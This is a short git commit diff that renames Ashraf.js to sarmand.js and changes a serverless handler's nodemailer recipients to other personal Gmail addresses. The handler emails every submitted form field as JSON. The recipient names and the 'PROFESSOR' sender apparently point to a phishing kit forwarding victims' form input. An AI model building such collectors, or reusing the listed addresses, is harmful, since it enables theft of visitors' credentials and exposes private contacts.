c210dfe00be1e34b6dc2b9b8ccdec3077c4140ae
zm9807350 <zm9807350@gmail.com>
2026-01-08 16:14:34 +0500

    Update and rename Ashraf.js to sarmand.js

--- sarmand.js
+++ sarmand.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,submitdispute@gmail.com,newzatpage@gmail.com,ccntnizamani@gmail.com",
-      subject: "Ashraf",
+      to: "nizamanekhud@gmail.com,sarmandnizami@gmail.com",
+      subject: "sarmand",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
